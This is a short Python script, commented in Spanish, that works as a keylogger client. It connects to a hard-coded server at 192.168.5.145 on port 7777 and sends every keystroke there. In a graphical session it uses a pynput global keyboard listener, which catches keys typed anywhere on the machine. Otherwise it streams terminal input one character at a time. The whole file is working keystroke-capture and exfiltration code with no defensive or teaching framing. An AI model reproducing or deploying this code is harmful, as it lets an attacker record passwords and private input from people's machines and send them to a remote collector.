import socket
import sys
from colorama import Fore, Style, init
import select

# Inicializar colorama
init(autoreset=True)

# Dirección IP y puerto del servidor
SERVER_IP = '192.168.5.145'  # Reemplaza con la IP del servidor
PORT = 7777

# Crear un socket para conectarse al servidor
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_IP, PORT))

print(Fore.GREEN + Style.BRIGHT + f"\n{'='*60}")
print(Fore.GREEN + Style.BRIGHT + f"🟢 Conectado al servidor en {SERVER_IP}:{PORT}")
print(Fore.GREEN + Style.BRIGHT + f"{'='*60}\n")

# Función para enviar datos al servidor
def send_to_server(key):
    client_socket.sendall(key.encode('utf-8'))

# Función para la captura de teclas en modo SSH/Terminal
def capture_input_from_terminal():
    try:
        print(Fore.CYAN + Style.BRIGHT + "⌨️ Capturando la entrada del teclado en modo terminal...\n")
        while True:
            # Esperar entrada del usuario
            ready, _, _ = select.select([sys.stdin], [], [], 0.1)
            if ready:
                data = sys.stdin.read(1)
                if data:
                    send_to_server(data)
    except Exception as e:
        print(Fore.RED + Style.BRIGHT + f"\n❌ Error capturando la entrada: {e}\n")

# Intentar importar pynput para entornos gráficos
try:
    from pynput import keyboard as pynput_keyboard
    use_pynput = True
except ImportError:
    use_pynput = False

# Manejador de eventos para pynput (solo en entorno gráfico)
def on_pynput_key_press(key):
    try:
        key_str = key.char if key.char else str(key)
    except AttributeError:
        key_str = str(key)
    send_to_server(key_str)

try:
    if use_pynput:
        print(Fore.CYAN + Style.BRIGHT + "🔄 Usando pynput para captura de teclas en entorno gráfico.")
        listener = pynput_keyboard.Listener(on_press=on_pynput_key_press)
        listener.start()
        listener.join()
    else:
        capture_input_from_terminal()
except Exception as e:
    print(Fore.RED + Style.BRIGHT + f"\n❌ Error en la ejecución: {e}\n")
finally:
    client_socket.close()
    print(Fore.MAGENTA + Style.BRIGHT + "\n🔒 Conexión cerrada.\n")
